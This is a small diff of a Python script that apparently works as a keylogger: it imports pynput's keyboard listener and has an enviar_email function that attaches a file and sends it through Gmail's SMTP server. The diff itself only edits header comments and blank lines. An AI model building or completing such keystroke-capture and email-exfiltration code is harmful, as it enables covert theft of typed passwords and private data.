@@ -1,9 +1,8 @@
-#!/usr/bin/env python2
-# -*- coding: utf-8 -*-
+
 """"
 Created on 30/9/2022
 
-@Author: i_f1xiT
+@i_f1xiTXQC 
 """
 import datetime
 from pynput.keyboard import Listener
@@ -95,8 +94,6 @@ def enviar_email(nombre):
     p.set_payload((attachment).read())
     p.add_header('Content-Disposition',"attachment; filename= %s" % str(nombre))
     msg.attach(p)
-
-
 
 
     server = smtplib.SMTP('smtp.gmail.com: 587')
